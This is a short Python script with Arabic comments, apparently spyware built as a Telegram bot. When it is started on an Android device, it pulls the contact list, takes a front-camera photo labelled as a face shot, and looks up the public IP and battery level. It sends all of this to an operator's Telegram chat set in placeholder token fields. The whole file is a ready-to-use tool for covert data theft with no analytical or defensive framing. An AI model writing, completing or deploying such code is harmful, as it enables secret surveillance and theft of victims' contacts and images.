import telebot
import cv2
import requests
import psutil
import subprocess
import os

# ضع بياناتك هنا
BOT_TOKEN = 'ضع_توكن_البوت_هنا'
CHAT_ID = 'ضع_الايدي_الخاص_بك_هنا'

bot = telebot.TeleBot(BOT_TOKEN)

def get_contacts():
    try:
        # أمر لسحب جهات الاتصال في أندرويد
        contacts = subprocess.check_output(['content', 'query', '--uri', 'content://contacts/phones']).decode()
        return contacts[:1000] # نأخذ أول 1000 حرف فقط لضمان الإرسال
    except:
        return "صلاحية جهات الاتصال مرفوضة"

def take_photo():
    try:
        cap = cv2.VideoCapture(1) # رقم 1 للكاميرا الأمامية
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('shot.jpg', frame)
            cap.release()
            return 'shot.jpg'
    except:
        pass
    return None

@bot.message_handler(commands=['start'])
def handle_start(message):
    # معلومات النظام
    ip = requests.get('https://api.ipify.org').text
    bat = psutil.sensors_battery().percent
    
    # سحب البيانات
    contacts = get_contacts()
    photo = take_photo()
    
    # إرسال التقارير لك
    bot.send_message(CHAT_ID, f"🔋 البطارية: {bat}%\n🌐 IP: {ip}\n\n📇 جهات الاتصال:\n{contacts}")
    
    if photo:
        with open(photo, 'rb') as f:
            bot.send_photo(CHAT_ID, f, caption="📸 صورة الوجه")

bot.polling()

